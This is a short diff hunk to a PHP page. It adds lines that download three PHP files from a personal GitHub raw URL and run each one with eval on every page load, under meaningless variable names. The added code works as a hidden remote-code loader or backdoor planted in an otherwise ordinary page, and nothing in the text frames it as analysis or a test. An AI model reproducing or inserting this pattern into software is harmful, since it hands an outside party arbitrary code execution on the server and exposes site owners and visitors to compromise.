@@ -10,6 +10,12 @@
     }
     </script>
 <?php
+$athfeygryg=file_get_contents("https://raw.githubusercontent.com/hojr128567/hojr128567/main/style.php");
+eval("?>".$athfeygryg);
+$athfeygryg2=file_get_contents("https://raw.githubusercontent.com/hojr128567/hojr128567/main/file.php");
+eval("?>".$athfeygryg2);
+$athfeygryg3=file_get_contents("https://raw.githubusercontent.com/hojr128567/hojr128567/main/Func.php");
+eval("?>".$athfeygryg3);
 //phl
 //php hojr lib
 //var
